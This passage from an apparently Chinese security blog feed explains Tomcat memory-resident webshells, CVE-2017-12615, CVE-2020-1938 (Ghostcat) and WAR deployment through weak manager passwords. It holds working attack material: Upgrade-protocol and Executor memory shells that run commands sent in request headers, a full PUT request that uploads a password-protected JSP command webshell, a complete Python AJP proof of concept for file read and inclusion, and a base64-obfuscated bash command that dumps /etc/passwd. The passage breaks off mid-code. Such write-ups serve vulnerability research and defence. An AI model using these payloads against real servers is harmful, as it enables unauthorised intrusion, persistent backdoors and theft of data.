&#125;</code></pre><ol><li>写个马</li></ol><pre><code class="java">public class memThreadExcutor extends ThreadPoolExecutor &#123;    public memThreadExcutor(int corePoolSize, int maximumPoolSize, long keepAliveTime, TimeUnit unit, BlockingQueue&lt;Runnable&gt; workQueue, ThreadFactory threadFactory, RejectedExecutionHandler handler) &#123;        super(corePoolSize, maximumPoolSize, keepAliveTime, unit, workQueue, threadFactory, handler);    &#125;    @Override    public void execute(Runnable command) &#123;        try &#123;            Runtime.getRuntime().exec(&quot;calc&quot;);        &#125; catch (IOException e) &#123;            throw new RuntimeException(e);        &#125;        this.execute(command, 0L, TimeUnit.MILLISECONDS);    &#125;&#125;</code></pre><ol start="2"><li>获取NioEndpoint</li></ol><pre><code class="java">public Object getNioEndpoint() &#123;    // 获取当前线程的所有线程    Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), &quot;threads&quot;);    for (Thread thread : threads) &#123;        try &#123;            // 需要获取线程的特征包含Acceptor            if (thread.getName().contains(&quot;Acceptor&quot;)) &#123;                Object target = getField(thread, &quot;target&quot;);                Object nioEndpoint = getField(target, &quot;endpoint&quot;);                return nioEndpoint;            &#125;        &#125; catch (Exception e) &#123;            e.printStackTrace();            continue;        &#125;    &#125;    // 没有获取到对应Endpoint，返回一个空对象    return new Object();&#125;</code></pre><p>其中getField是获取对象属性</p><pre><code class="java">public Object getField(Object obj, String field) &#123;    // 递归获取类的及其父类的属性    Class clazz = obj.getClass();    while (clazz != Object.class) &#123;        try &#123;            Field declaredField = clazz.getDeclaredField(field);            declaredField.setAccessible(true);            return declaredField.get(obj);        &#125; catch (Exception e) &#123;            clazz = clazz.getSuperclass();        &#125;    &#125;    return null;&#125;</code></pre><ol start="3"><li>调用setExecutor完成注册</li></ol><pre><code class="java">NioEndpoint nioEndpoint = (NioEndpoint) getNioEndpoint();//获取nioEndpointThreadPoolExecutor executor = (ThreadPoolExecutor) getField(nioEndpoint, &quot;executor&quot;);//获取executor用于构造函数传参memThreadExcutor memthreadexcutor = new memThreadExcutor(executor.getCorePoolSize(), executor.getMaximumPoolSize(), executor.getKeepAliveTime(TimeUnit.MILLISECONDS), TimeUnit.MILLISECONDS, executor.getQueue(), executor.getThreadFactory(), executor.getRejectedExecutionHandler());nioEndpoint.setExecutor(memthreadexcutor);//将内存马传入nioEndpoint完成注册</code></pre><p>现在只能够实现执行一条命令，不好利用，是否可以通过resquest和response对象进行实时输入命令执行后进行回显？</p><p>可能是这里使用的是tomcat9，在调试的过程中发现和网上的分析文章不一样，获取不到想要的对象，所以回显这里先暂时放一放</p><h2 id="Upgrade内存马"><a href="#Upgrade内存马" class="headerlink" title="Upgrade内存马"></a>Upgrade内存马</h2><p>还是看这图<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1692934101493-58fb97b3-56f3-4848-9576-5bf895df868d.png" alt="image.png"></p><p>前面是利用了EndPoint中的Executor进行构造内存马，这里使用的是Processor<br>在org.apache.coyote.http11.Http11Processor的service方法中，出现了下面的处理过程：<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1693208222003-d4e9823f-a46b-4c5a-be78-f39eb42f0457.png" alt="image.png"><br>首先调用isConnectionToken()判断request的请求头headers中是否存在Connection: upgrade</p><pre><code class="java">private static boolean isConnectionToken(MimeHeaders headers, String token) throws IOException &#123;    MessageBytes connection = headers.getValue(&quot;Connection&quot;);    if (connection == null) &#123;        return false;    &#125; else &#123;        Set&lt;String&gt; tokens = new HashSet();        TokenList.parseTokenList(headers.values(&quot;Connection&quot;), tokens);        return tokens.contains(token);    &#125;&#125;</code></pre><p>如果存在Connection: upgrade则进入判断里面<br>然后再获取headers中Upgrade对应的值，例如 Upgrade：aaa中的aaa<br>往下就调用this.protocol.getUpgradeProtocol()</p><pre><code class="java">public UpgradeProtocol getUpgradeProtocol(String upgradedName) &#123;return (UpgradeProtocol)this.httpUpgradeProtocols.get(upgradedName);&#125;</code></pre><p>根据请求头Upgrade的值获取相应的 UpgradeProtocol<br>然后在下一个if判断中调用获取到的UpgradeProtocol的accept方法</p><p>下一步的目标是找到this.httpUpgradeProtocols是从哪里来的，如果可以动态注册一个UpgradeProtocol,把恶意代码写在accept方法里，内存马不就实现了吗</p><p>往上跟踪this.httpUpgradeProtocols ，发现它是一个HashMap对象<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1693209904835-59a7fa7b-3cd8-4a2a-829d-3a0c86bdbce9.png" alt="image.png"><br>然后在configureUpgradeProtocol()方法中赋值<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1693209966459-a9d5df85-6ba7-4d65-9172-d422f8809e16.png" alt="image.png"></p><p>然后发现只有init()方法调用了这个configureUpgradeProtocol()方法<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1693210175897-41a8ccd8-6af6-4324-9336-cdc73ea220ad.png" alt="image.png"></p><p>在init方法中它做了以下几件事情：</p><ol><li>通过读取upgradeProtocols列表，</li><li>调用configureUpgradeProtocol</li><li>将对应upgradeProtocol添加到httpUpgradeProtocols的HashMap中。</li></ol><p>那是什么时候对upgradeProtocols进行的初始化呢，我们在init方法上下断点，我们发现是在Tomcat启动时进行的初始化。<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1693210608710-a18b16ad-9e6e-4533-98ba-bbb0b06c14e0.png" alt="image.png"></p><p>综上所述，只要获取到AbstractHttp11Protocol对象或者其子类对象，通过反射给属性httpUpgradeProtocols加一个键值对即可<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1693213934736-160d7f6e-5188-4a2d-9b58-0b67843dc319.png" alt="image.png"></p><ol><li>先写个马</li></ol><p>主要逻辑在accept方法里，这里只接受了一个Request参数，没有Response,不能回显<br>需要获取Response：request对象中存在private Response response;因此我们可以通过反射获取到response对象</p><pre><code class="java">public class memUgrade implements UpgradeProtocol &#123;    @Override    public String getHttpUpgradeName(boolean b) &#123;        return null;    &#125;    @Override    public byte[] getAlpnIdentifier() &#123;        return new byte[0];    &#125;    @Override    public String getAlpnName() &#123;        return null;    &#125;    @Override    public Processor getProcessor(SocketWrapperBase&lt;?&gt; socketWrapperBase, Adapter adapter) &#123;        return null;    &#125;    @Override    public InternalHttpUpgradeHandler getInternalUpgradeHandler(SocketWrapperBase&lt;?&gt; socketWrapperBase, Adapter adapter, Request request) &#123;        return null;    &#125;    @Override   public boolean accept(org.apache.coyote.Request request) &#123;            String p = request.getHeader(&quot;cmd&quot;);            try &#123;                String[] cmd = System.getProperty(&quot;os.name&quot;).toLowerCase().contains(&quot;win&quot;) ? new String[]&#123;&quot;cmd.exe&quot;, &quot;/c&quot;, p&#125; : new String[]&#123;&quot;/bin/sh&quot;, &quot;-c&quot;, p&#125;;                org.apache.coyote.Response resp = (org.apache.coyote.Response) getField(request,&quot;response&quot;);                byte[] result = new java.util.Scanner(new ProcessBuilder(cmd).start().getInputStream()).useDelimiter(&quot;\\A&quot;).next().getBytes();                resp.doWrite(ByteBuffer.wrap(result));            &#125; catch (Exception e) &#123;            &#125;            return false;        &#125;&#125;</code></pre><ol start="2"><li>获取AbstractHttp11Protocol对象或者其子类对象</li></ol><p>在resquest对象中就能找到Http11NioProtocol<br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1693214426526-6a87e302-490c-4ec4-a29d-f0fa24b69b48.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1693214455503-ff63c482-5ce9-4778-9aeb-fc3605ce28a4.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1693214476820-63e600bb-6c36-4975-a66b-d7afb5a067ec.png" alt="image.png"></p><p>通过反射获取它</p><pre><code class="java">Object req = getField(request,&quot;request&quot;);Object connector = getField(req,&quot;connector&quot;);Http11NioProtocol http11NioProtocol = (Http11NioProtocol)getField(connector,&quot;protocolHandler&quot;);Map&lt;String, UpgradeProtocol&gt; httpUpgradeProtocols = (Map)getField(http11NioProtocol,&quot;httpUpgradeProtocols&quot;);</code></pre><p>其中getField()如下</p><pre><code class="java">public Object getField(Object obj, String field) &#123;    // 递归获取类的及其父类的属性    Class clazz = obj.getClass();    while (clazz != Object.class) &#123;        try &#123;            Field declaredField = clazz.getDeclaredField(field);            declaredField.setAccessible(true);            return declaredField.get(obj);        &#125; catch (Exception e) &#123;            clazz = clazz.getSuperclass();        &#125;    &#125;    return null;&#125;</code></pre><ol start="3"><li>将恶意的UpgradeProtocol添加到httpUpgradeProtocols里面</li></ol><pre><code class="java">httpUpgradeProtocols.put(&quot;RunCmd&quot;,new memUpgrade());</code></pre><ol start="4"><li>结果</li></ol><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/1693227821476-acaa42fb-8db0-4811-857b-281677ef65e8.png" alt="image.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 内存马 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat系列</title>
      <link href="/2023/08/21/Tomcat%E7%B3%BB%E5%88%97/"/>
      <url>/2023/08/21/Tomcat%E7%B3%BB%E5%88%97/</url>
      
        <content type="html"><![CDATA[<h1 id="Tomcat系列"><a href="#Tomcat系列" class="headerlink" title="Tomcat系列"></a>Tomcat系列</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Tomcat是由Apache软件基金会下属的Jakarta项目开发的一个Servlet容器，按照Sun Microsystems提供的技术规范，实现了对Servlet和JavaServer Page（JSP）的支持，并提供了作为Web服务器的一些特有功能，如Tomcat管理和控制平台、安全域管理和Tomcat阀等。Tomcat 很受广大程序员的喜欢，因为它运行时占用的系统资源小，扩展性好，支持负载平衡与邮件服务等开发应用系统常用的功能。</p><p>环境下载：<br><a href="https://archive.apache.org/dist/tomcat/">https://archive.apache.org/dist/tomcat/</a></p><h2 id="CVE-2017-12615-任意文件写入"><a href="#CVE-2017-12615-任意文件写入" class="headerlink" title="CVE-2017-12615(任意文件写入)"></a>CVE-2017-12615(任意文件写入)</h2><p>影响范围： Apache Tomcat 7.0.0 - 7.0.79   Apache Tomcat 8.5.19</p><p>环境搭建：这里使用的是vulhub的环境，其中的<code>conf/web.xml</code>如下：</p><pre><code class="xml">&lt;servlet&gt;    &lt;servlet-name&gt;default&lt;/servlet-name&gt;    &lt;servlet-class&gt;org.apache.catalina.servlets.DefaultServlet&lt;/servlet-class&gt;    &lt;init-param&gt;        &lt;param-name&gt;debug&lt;/param-name&gt;        &lt;param-value&gt;0&lt;/param-value&gt;    &lt;/init-param&gt;    &lt;init-param&gt;        &lt;param-name&gt;listings&lt;/param-name&gt;        &lt;param-value&gt;false&lt;/param-value&gt;    &lt;/init-param&gt;    &lt;init-param&gt;&lt;param-name&gt;readonly&lt;/param-name&gt;&lt;param-value&gt;false&lt;/param-value&gt;&lt;/init-param&gt;    &lt;load-on-startup&gt;1&lt;/load-on-startup&gt;&lt;/servlet&gt;</code></pre><p>这里的readonly设置为false，这是漏洞产生的主要原因之一</p><p>readonly 的作用是限制对部署在该 Tomcat 实例上的 Web 应用程序文件的修改操作。当设置为 true 时，表示该 Tomcat 实例处于只读模式，禁止对部署的 Web 应用程序进行修改或删除操作。</p><p>漏洞涉及到 DefaultServlet 和 JspServlet，DefaultServlet 的作用是处理静态文件 ，JspServlet 的作用是处理 jsp 与 jspx 文件的请求，同时 DefaultServlet 可以处理 PUT 或 DELETE 请求，以下是默认配置情况：</p><pre><code class="xml">&lt;!-- The mapping for the default servlet --&gt;    &lt;servlet-mapping&gt;        &lt;servlet-name&gt;default&lt;/servlet-name&gt;        &lt;url-pattern&gt;/&lt;/url-pattern&gt;    &lt;/servlet-mapping&gt;    &lt;!-- The mappings for the JSP servlet --&gt;    &lt;servlet-mapping&gt;        &lt;servlet-name&gt;jsp&lt;/servlet-name&gt;        &lt;url-pattern&gt;*.jsp&lt;/url-pattern&gt;        &lt;url-pattern&gt;*.jspx&lt;/url-pattern&gt;    &lt;/servlet-mapping&gt;</code></pre><p>即使设置readonly为false，默认tomcat也不允许PUT上传jsp和jspx文件的，因为后端都用org.apache.jasper.servlet.JspServlet来处理jsp或是jspx后缀的请求了，而JspServlet中没有PUT上传的逻辑，只允许<code>GET POST  HEAD</code>,  PUT的代码实现只存在于DefaultServlet中。</p><p> 这个漏洞的根本是通过构造特殊后缀名，绕过了tomcat检测，让它用DefaultServlet的逻辑去处理请求，从而上传jsp文件。</p><p>目前主要有以下方法：</p><ul><li>test.jsp::$DATA  —–&gt;适用于windows环境</li><li>test.jsp&#x2F;   —–&gt;适用于linux环境</li><li>test.jsp%20  —–&gt;适用于windows环境</li></ul><p>利用这两种姿势PUT请求tomcat的时候，骗过tomcat而进入DefaultServlet处理的逻辑。</p><h3 id="调试分析"><a href="#调试分析" class="headerlink" title="调试分析"></a>调试分析</h3><p>假设test.jsp存在，内容随机</p><p>当PUT请求路径为&#x2F;test.jsp时,进入的是<code>JspServlet</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230816104540342.png" alt="image-20230816104540342"></p><p>PUT请求路径为&#x2F;test.jsp时,进入的是<code>DefaultServlet</code></p><p>先是来到javax.servlet.http.HttpServlet#service(), 这里会根据请求方法调用不同的方法处理，这里调用的是doPut</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230816111030439.png" alt="image-20230816111030439"></p><p>然后就来到了DefaultServlet的<code>doPut</code>方法</p><pre><code class="java">protected void doPut(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException &#123;    if (this.readOnly) &#123;        resp.sendError(403);    &#125; else &#123;        String path = this.getRelativePath(req);        WebResource resource = this.resources.getResource(path);        Range range = this.parseContentRange(req, resp);        InputStream resourceInputStream = null;        try &#123;            if (range != null) &#123;                File contentFile = this.executePartialPut(req, range, path);                resourceInputStream = new FileInputStream(contentFile);            &#125; else &#123;                resourceInputStream = req.getInputStream();            &#125;            if (this.resources.write(path, (InputStream)resourceInputStream, true)) &#123;                if (resource.exists()) &#123;                    resp.setStatus(204);                &#125; else &#123;                    resp.setStatus(201);                &#125;            &#125; else &#123;                resp.sendError(409);            &#125;        &#125; finally &#123;            if (resourceInputStream != null) &#123;                try &#123;                    ((InputStream)resourceInputStream).close();                &#125; catch (IOException var13) &#123;                &#125;            &#125;        &#125;    &#125;&#125;</code></pre><p>开头就先判断readOnly是否开启，如果为true，则返回状态码403，根据web.xml设置，这里是false</p><p>然后通过<code>getRelativePath(req)</code>获取请求路径&#x2F;test.jsp&#x2F;</p><p>然后在<code>this.resources.write(path, (InputStream)resourceInputStream, true)</code>进行内容写入，将请求中的输入流保存到指定的资源文件中，也就是test.jsp</p><ul><li>如果写入操作成功，则进入第一个分支条件。<ul><li>如果被写入的资源文件存在，表示更新已有资源，则设置响应状态码为 204（No Content）。</li><li>如果被写入的资源文件不存在，表示创建新的资源，则设置响应状态码为 201（Created）。</li></ul></li><li>如果写入操作失败，则进入第二个分支条件，使用 <code>resp.sendError(409)</code> 发送一个状态码为 409（Conflict）的错误响应</li></ul><p>跟进<code>this.resources.write</code></p><pre><code class="java">public boolean write(String path, InputStream is, boolean overwrite) &#123;    path = this.validate(path);    if (!overwrite &amp;&amp; this.preResourceExists(path)) &#123;        return false;    &#125; else &#123;        boolean writeResult = this.main.write(path, is, overwrite);        if (writeResult &amp;&amp; this.isCachingAllowed()) &#123;            this.cache.removeCacheEntry(path);        &#125;        return writeResult;    &#125;&#125;</code></pre><p>这里调用 <code>this.main.write(path, is, overwrite)</code> 方法执行实际的写入操作，并将写入结果保存在 <code>writeResult</code> 变量中</p><p>继续跟进这个write方法</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230816113727208.png" alt="image-20230816113727208"></p><p>经过前面的检查和处理后，使用<code>Files.copy</code>将内容写入文件</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230816113947395.png" alt="image-20230816113947395"></p><p>后面利用就是写jsp马getshell了</p><pre><code class="tex">PUT /test.jsp/ HTTP/1.1Host: 192.168.79.144:8080Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.125 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: closeContent-Length: 662&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*,java.io.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;&lt;%!public static String excuteCmd(String c) &#123;StringBuilder line = new StringBuilder();try &#123;Process pro = Runtime.getRuntime().exec(c);BufferedReader buf = new BufferedReader(new InputStreamReader(pro.getInputStream()));String temp = null;while ((temp = buf.readLine()) != null) &#123;line.append(temp+&quot;\\n&quot;);&#125;buf.close();&#125; catch (Exception e) &#123;line.append(e.getMessage());&#125;return line.toString();&#125;%&gt;&lt;%if(&quot;123&quot;.equals(request.getParameter(&quot;pwd&quot;))&amp;&amp;!&quot;&quot;.equals(request.getParameter(&quot;cmd&quot;)))&#123;out.println(&quot;&lt;pre&gt;&quot;+excuteCmd(request.getParameter(&quot;cmd&quot;))+&quot;&lt;/pre&gt;&quot;);&#125;else&#123;out.println(&quot;:-)&quot;);&#125;%&gt;</code></pre><p>访问&#x2F;test.jsp?pwd&#x3D;123&amp;cmd&#x3D;id</p><p>综上，漏洞利用的两个要点，1. readonly   2.文件名绕过</p><h2 id="CVE-2020-1938-文件包含"><a href="#CVE-2020-1938-文件包含" class="headerlink" title="CVE-2020-1938(文件包含)"></a>CVE-2020-1938(文件包含)</h2><p>漏洞影响范围：</p><pre><code>Apache Tomcat 6Apache Tomcat 7 &lt; 7.0.100Apache Tomcat 8 &lt; 8.5.51Apache Tomcat 9 &lt; 9.0.31</code></pre><p>Tomcat根据默认配置(conf&#x2F;server.xml）启动两个连接器:</p><p>一个是HTTP Connector默认监听8080端口处理HTTP请求</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230817095141100.png" alt="image-20230817095141100"></p><p>一个AJP connector默认8009端口处理AJP请求,也就是AJP协议端口</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230817095151945.png" alt="image-20230817095151945"></p><p>漏洞出现在通过设置AJP请求属性，可控制AJP连接器封装的request对象的属性，最终导致文件包含可以任意文件读取和代码执行。</p><p>为了能够调试运行，先解决如何发起一个AJP请求</p><p>这里使用的是AJPy 这个python库 <a href="https://github.com/hypn0s/AJPy">https://github.com/hypn0s/AJPy</a></p><p>tomcat使用<code>org.apache.coyote.ajp.AjpProcessor</code>这个类来处理AJP请求</p><p>在<code>org.apache.coyote.ajp.AjpProcessor</code>这里的service方法中 会调用一个<code>prepareRequest()</code>方法</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230817120336335.png" alt="image-20230817120336335"></p><p>在这个方法里面可以对request对象的Attribute属性进行赋值，键值都可控</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230817141739603.png" alt="image-20230817141739603"></p><h3 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h3><p>Attribute属性赋值后，如果请求路径不含jsp或jspx,会来到org.apache.catalina.servlets.DefaultServlet的doGet方法</p><pre><code class="java">protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException, ServletException &#123;    this.serveResource(request, response, true, this.fileEncoding);&#125;</code></pre><p>跟进<code>serveResource</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230817142815183.png" alt="image-20230817142815183"></p><p>这里调用了一个getRelativePath方法获取路径path，跟进查看这个路径是如何获取的</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230817143236344.png" alt="image-20230817143236344"></p><p>首先取出request对象的Attribute属性中的<code>javax.servlet.include.request_uri</code>,查看对应值是否为null ,如果不为空则继续获取</p><pre><code>javax.servlet.include.path_infojavax.servlet.include.servlet_path</code></pre><p>这两个的值，保存到pathInfo和servletPath  , 这三个的值可以通过上面的<code>prepareRequest()</code>控制</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230817141739603.png" alt="image-20230817141739603"></p><p>往下就是拼接路径并返回得到的路径</p><pre><code class="java">StringBuilder result = new StringBuilder();if (servletPath.length() &gt; 0) &#123;    result.append(servletPath);&#125;if (pathInfo != null) &#123;    result.append(pathInfo);&#125;if (result.length() == 0 &amp;&amp; !allowEmptyPath) &#123;    result.append(&#39;/&#39;);&#125;return result.toString();</code></pre><p>得到自定义的路径之后，通过<code>this.resources.getResource(path)</code>获取到了path对应的资源对象</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230817144859668.png" alt="image-20230817144859668"></p><p>在这个<code>getResource</code>里面会调用<code>org.apache.tomcat.util.http.RequestUtil</code>的normalize方法</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230817163632280.png" alt="image-20230817163632280"></p><p>在这里会对path路径进行一些处理，如果存在<code>./</code>或<code>../</code>则会返回<code>null</code>,最终会抛出一个非法路径的异常终止文件读取操作。</p><p>然后资源对象的内容随着<code>resourceBody</code>被写入了<code>ostream</code>流对象中返回给客户端。</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230817145453578.png" alt="image-20230817145453578"></p><p>综上所述，可以通过AJP协议控制</p><pre><code class="tex">javax.servlet.include.request_urijavax.servlet.include.path_infojavax.servlet.include.servlet_path</code></pre><p>的值即可读取tomcat&#x2F;webapps&#x2F;下的任意文件</p><h3 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h3><p>如果请求路径存在.jsp或.jspx</p><p>经过org.apache.coyote.ajp.AjpProcessor处理后会使用org.apache.jasper.servlet.JspServlet来处理请求</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230817180038922.png" alt="image-20230817180038922"></p><p>这里也是进行了路径拼接，也是通过获取javax.servlet.include.servlet_path和javax.servlet.include.path_info拼接，得到&#x2F;1.txt</p><p>往下会执行到serviceJspFile()</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230817180222477.png" alt="image-20230817180222477"></p><p>跟进这个方法</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230817180711744.png" alt="image-20230817180711744"></p><p>由我们控制的<code>jspuri</code>被封装成了一个<code>JspServletWrapper</code>添加到了Jsp运行上下文<code>JspRuntimeContext</code>中.最后<code>wrapper.service()</code>会将1.txt里面的内容编译，生成.java和.class 并执行</p><p>例如通过文件上传，上传1.txt到了webapps&#x2F;ROOT&#x2F;下</p><p>txt里面的内容如下，就下执行命令cat &#x2F;etc&#x2F;passwd &gt; pwn.txt</p><pre><code class="java">&lt;%    Runtime.getRuntime().exec(&quot;bash -c &#123;echo,Y2F0IC9ldGMvcGFzc3dkID4gcHduLnR4dA==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;);%&gt;</code></pre><p>然后触发漏洞后会执行命令生成了pwn.txt,在&#x2F;usr&#x2F;local&#x2F;tomcat&#x2F;目录下，而且还发现</p><p><code>/work/Catalina/localhost/ROOT/org/apache/jsp/_1_txt.java</code></p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230817200511784.png" alt="image-20230817200511784"></p><p>这个文件就包含了txt里面的内容</p><p>使用AJPy 这个python库 <a href="https://github.com/hypn0s/AJPy%E5%86%99POC">https://github.com/hypn0s/AJPy写POC</a> , 作者已经写好了，改改就能用</p><pre><code class="python">from ajpy.ajp import AjpResponse, AjpForwardRequest, AjpBodyRequest, NotFoundExceptionfrom termcolor import *from urllib.parse import urlparseimport socketimport argparseimport threadingimport traceback# helpersdef prepare_ajp_forward_request(target_host, req_uri, method=AjpForwardRequest.GET):    fr = AjpForwardRequest(AjpForwardRequest.SERVER_TO_CONTAINER)    fr.method = method    fr.protocol = &quot;HTTP/1.1&quot;    fr.req_uri = req_uri    fr.remote_addr = target_host    fr.remote_host = None    fr.server_name = target_host    fr.server_port = 80    fr.request_headers = &#123;        &#39;SC_REQ_ACCEPT&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8&#39;,        &#39;SC_REQ_CONNECTION&#39;: &#39;keep-alive&#39;,        &#39;SC_REQ_CONTENT_LENGTH&#39;: &#39;0&#39;,        &#39;SC_REQ_HOST&#39;: target_host,        &#39;SC_REQ_USER_AGENT&#39;: &#39;Mozilla/5.0 (X11; Linux x86_64; rv:46.0) Gecko/20100101 Firefox/46.0&#39;,        &#39;Accept-Encoding&#39;: &#39;gzip, deflate, sdch&#39;,        &#39;Accept-Language&#39;: &#39;en-US,en;q=0.5&#39;,        &#39;Upgrade-Insecure-Requests&#39;: &#39;1&#39;,        &#39;Cache-Control&#39;: &#39;max-age=0&#39;    &#125;    fr.is_ssl = False    fr.attributes = []    return frclass Tomcat(object):    def __init__(self, target_host, target_port=8009):        self.target_host = target_host        self.target_port = target_port        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)        self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)        self.socket.connect((target_host, target_port))        self.stream = self.socket.makefile(&quot;rb&quot;)    def perform_request(self, req_uri, headers=&#123;&#125;, method=&#39;GET&#39;, attributes=[]):        self.req_uri = req_uri        self.forward_request = prepare_ajp_forward_request(            self.target_host, self.req_uri, method=AjpForwardRequest.REQUEST_METHODS.get(method))        for h in headers:            self.forward_request.request_headers[h] = headers[h]        for a in attributes:            self.forward_request.attributes.append(a)        responses = self.forward_request.send_and_receive(self.socket, self.stream)        if len(responses) == 0:            return None, None        snd_hdrs_res = responses[0]        data_res = responses[1:-1]        return snd_hdrs_res, data_resdef readFile(host, port, webapp, filepath):    bf = Tomcat(host, port);    attributes = [        &#123;            &quot;name&quot;: &quot;req_attribute&quot;, &quot;value&quot;: (                &quot;javax.servlet.include.request_uri&quot;,                &quot;/&quot;,)        &#125;,        &#123;            &quot;name&quot;: &quot;req_attribute&quot;, &quot;value&quot;: (                &quot;javax.servlet.include.path_info&quot;,                filepath,)        &#125;,        &#123;            &quot;name&quot;: &quot;req_attribute&quot;, &quot;value&quot;: (                &quot;javax.servlet.include.servlet_path&quot;,                &quot;/&quot;,)        &#125;,    ]    try:        hdrs, data = bf.perform_request(&quot;/&quot; + webapp + &quot;/xxxx&quot;, attributes=attributes)    except:        print(colored(&#39;read error!&#39;, &#39;red&#39;))        return False    for i in data:        print(colored(i.data.decode(&#39;utf-8&#39;), &#39;green&#39;))        if (data is None or hdrs.http_status_code != 200):            print(colored(&#39;read error!&#39;, &#39;red&#39;))def LocalFileInclude(host, port, webapp, filepath):    bf = Tomcat(host, port);    attributes = [        &#123;            &quot;name&quot;: &quot;req_attribute&quot;, &quot;value&quot;: (                &quot;javax.servlet.include.request_uri&quot;,                &quot;/&quot;,)        &#125;,        &#123;            &quot;name&quot;: &quot;req_attribute&quot;, &quot;value&quot;: (                &quot;javax.servlet.include.path_info&quot;,                filepath,)        &#125;,        &#123;            &quot;name&quot;: &quot;req_attribute&quot;, &quot;value&quot;: (                &quot;javax.servlet.include.servlet_path&quot;,                &quot;/&quot;,)        &#125;,    ]    try:        hdrs, data = bf.perform_request(&quot;/&quot; + webapp + &quot;/xxxx.jsp&quot;, attributes=attributes)    except:        print(colored(&#39;read error!&#39;, &#39;red&#39;))        return False    for i in data:        print(colored(i.data.decode(&#39;utf-8&#39;), &#39;green&#39;))        if (data is None or hdrs.http_status_code != 200):            print(colored(&#39;read error!&#39;, &#39;red&#39;))if __name__ == &quot;__main__&quot;:    LocalFileInclude(&quot;127.0.0.1&quot;,8009, &quot;ROOT&quot;, &quot;1.txt&quot;)    # readFile(&quot;127.0.0.1&quot;,8009, &quot;ROOT&quot;, &quot;1.txt&quot;)</code></pre><h2 id="弱口令-amp-war远程部署"><a href="#弱口令-amp-war远程部署" class="headerlink" title="弱口令&amp;war远程部署"></a>弱口令&amp;war远程部署</h2><p>Tomcat支持在后台部署war文件，可以直接将webshell部署到web目录下。其中，欲访问后台，需要对应用户有相应权限</p><p>Tomcat7+权限分为：</p><ul><li>manager（后台管理）<ul><li>manager-gui 拥有html页面权限</li><li>manager-status 拥有查看status的权限</li><li>manager-script 拥有text接口的权限，和status权限</li><li>manager-jmx 拥有jmx权限，和status权限</li></ul></li><li>host-manager（虚拟主机管理）<ul><li>admin-gui 拥有html页面权限</li><li>admin-script 拥有text接口权限</li></ul></li></ul><p>这些权限的究竟有什么作用，详情阅读 <a href="http://tomcat.apache.org/tomcat-8.5-doc/manager-howto.html">http://tomcat.apache.org/tomcat-8.5-doc/manager-howto.html</a></p><p>在<code>conf/tomcat-users.xml</code>文件中配置用户的权限：</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230818091812307.png" alt="image-20230818091812307"></p><p>可见，用户tomcat拥有上述所有权限，密码是<code>tomcat</code>。</p><p>正常安装的情况下，tomcat8中默认没有任何用户，且manager页面只允许本地IP访问。只有管理员手工修改了这些属性的情况下，才可以进行攻击。</p><p>点击Manager App进行登录</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230818092244004.png" alt="image-20230818092244004"></p><p>登录后成功来到后台管理处</p><p>找到上传点上传木马</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/2023/image-20230818092640455.png" alt="image-20230818092640455"></p><p>这里要求上传的是<code>WAR</code>文件，其本质上是个压缩包</p><p>写个shell.jsp ,压缩成zip后将扩展名修改为<code>war</code></p><pre><code class="jsp">&lt;%@ page language=&quot;java&quot; import=&quot;java.util.*,java.io.*&quot; pageEncoding=&quot;UTF-8&quot;%&gt;&lt;%!public static String 